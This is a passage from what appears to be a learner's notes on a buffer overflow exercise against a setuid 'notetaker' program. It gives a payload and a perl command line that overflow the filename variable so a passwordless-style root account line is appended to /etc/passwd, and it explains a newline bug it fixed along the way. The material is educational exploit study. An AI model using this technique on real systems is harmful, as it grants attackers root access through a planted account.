so this didn't work at first with the following payload:

    myroot:AAFunikgarhOc:0:0:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA:/root:/tmp/etc/passwd
    # hashed password is 'pass', salt is 'AA'

This was because of the following line in notetaker.c:

    strncat(buffer, "\n", 1);

It adds a newline after the buffer so eventually /etc/passwd would have a newline at the end (which is a good thing), but the overflown variable `datafile` also got this newline (in another words: there was newline pasted after /etc/passwd and before the null byte). Effectively the filename to append this passwd string was `/etc/passwd\n`. This worked correctly and I didn't notice where the error was by simply checking /etc/passwd. A new file `/etc/passwd?` was created next to it instead.

I decided to fix it (this is an ugly hack, normally I wouldn't be able to alter a given program this way) by changing the position where the newline is appended to the buffer. Excerpt from `notetaker.c` below:


    printf("DBG: buffer @ %p: \'%s\'\n", buffer, buffer);
    printf("DBG: datafile @ %p: \'%s\'\n", datafile, datafile);
    
    // strncat(buffer, "\n", 1); <-- moved below
    
    fd = open(datafile, O_WRONLY|O_CREAT|O_APPEND, S_IRUSR|S_IWUSR);
    if (fd == -1)
    fatal(("in main() while opening file %s", datafile));
    
    userid = geteuid();
    printf("DBG: File descriptor is %d and euserid is %d\n", fd, userid);
    
    // here
    strncat(buffer, "\n", 1);
    
    if (write(fd, &userid, sizeof(int)) == -1)
    fatal("in main() while writing userid to a file");
    

Now the following works fine:

    ./notetaker `perl -e 'print "myroot:AAFunikgarhOc:0:0:". "A"x68 . ":/root:/tmp/etc/passwd"'`
